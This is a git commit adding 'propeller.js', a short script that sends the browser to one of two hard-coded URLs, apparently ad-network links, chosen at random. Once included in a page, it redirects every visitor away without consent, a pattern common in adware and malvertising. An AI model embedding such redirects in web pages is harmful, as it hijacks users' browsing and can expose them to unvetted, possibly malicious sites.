1565b4981af2d5cb2293f727956f3ad9ee40459a
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-12-10 15:00:49 +0800

    Create propeller.js

---
+++ propeller.js
@@ -0,0 +1,10 @@
+var dataUrl = [
+  
+  'https://cdrvrs.com/4/4716439',
+  'https://usounoul.com/4/4716440'
+  
+  
+ 
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
